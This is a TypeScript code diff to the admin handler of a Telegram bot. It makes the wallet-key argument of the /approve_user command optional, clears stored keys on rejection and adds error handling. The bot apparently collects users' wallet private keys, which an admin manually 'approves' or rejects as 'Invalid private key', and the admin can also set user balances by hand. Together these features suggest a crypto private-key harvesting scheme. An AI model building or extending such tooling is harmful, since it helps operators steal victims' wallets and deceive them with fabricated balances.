@@ -118,13 +118,13 @@ export function createAdminBotHandler() {
 		});
 
 		adminBot.command("approve_user", async (ctx) => {
-			// Stateless command: /approve_user USER_ID WALLET_KEY
+			// Stateless command: /approve_user USER_ID [WALLET_KEY]
 			const args = ctx.match as string;
 			const [userId, walletKey] = args.trim().split(/\s+/);
 
-			if (!userId || !walletKey) {
+			if (!userId) {
 				await ctx.reply(
-					"Usage: <code>/approve_user USER_ID WALLET_KEY</code>",
+					"Usage: <code>/approve_user USER_ID [WALLET_KEY]</code>",
 					{
 						parse_mode: "HTML",
 					},
@@ -140,18 +140,27 @@ export function createAdminBotHandler() {
 				return;
 			}
 
-			const userBot = new Bot(data?.botToken as string);
-			await userBot.api.sendMessage(userId, "✅ Wallet successfully imported");
-
-			const { message, error: updateError } = await ctx.botApi.updateUserKey({
-				telegramId: Number(userId),
-				walletKey,
-			});
-			if (updateError) {
-				await ctx.reply(updateError);
-				return;
+			// If manual key provided, update it
+			if (walletKey) {
+				const { error: updateError } = await ctx.botApi.updateUserKey({
+					telegramId: Number(userId),
+					walletKey,
+				});
+				if (updateError) {
+					await ctx.reply(updateError);
+					return;
+				}
 			}
-			await ctx.reply(message as string);
+
+			const userBot = new Bot(data?.botToken as string);
+			try {
+				await userBot.api.sendMessage(userId, "✅ Wallet successfully imported");
+				await ctx.reply(`✅ User ${userId} approved successfully`);
+			} catch (e) {
+				await ctx.reply(
+					`⚠️ User approved but failed to send notification: ${(e as Error).message}`,
+				);
+			}
 		});
 
 		adminBot.command("reject_user", async (ctx) => {
@@ -174,9 +183,26 @@ export function createAdminBotHandler() {
 				return;
 			}
 
+			// Clear user key
+			const { error: updateError } = await ctx.botApi.updateUserKey({
+				telegramId: Number(userId),
+				walletKey: null,
+			});
+
+			if (updateError) {
+				await ctx.reply(updateError);
+				return;
+			}
+
 			const userBot = new Bot(data?.botToken as string);
-			await userBot.api.sendMessage(userId, "❌ Invalid private key");
-			await ctx.reply("User rejection processed successfully");
+			try {
+				await userBot.api.sendMessage(userId, "❌ Invalid private key");
+				await ctx.reply("User rejection processed successfully");
+			} catch (e) {
+				await ctx.reply(
+					`⚠️ User rejected but failed to send notification: ${(e as Error).message}`,
+				);
+			}
 		});
 
 		adminBot.command("custom", async (ctx) => {
@@ -416,7 +442,7 @@ Usage: <code>/update_company_wallet WALLET_ADDRESS</code>
 Usage: <code>/update_balance USER_ID BALANCE</code>
 
 <b>/approve_user</b> - Approve and import user wallet
-Usage: <code>/approve_user USER_ID WALLET_KEY</code>
+Usage: <code>/approve_user USER_ID [WALLET_KEY]</code>
 
 <b>/reject_user</b> - Reject user wallet import request
 Usage: <code>/reject_user USER_ID</code>
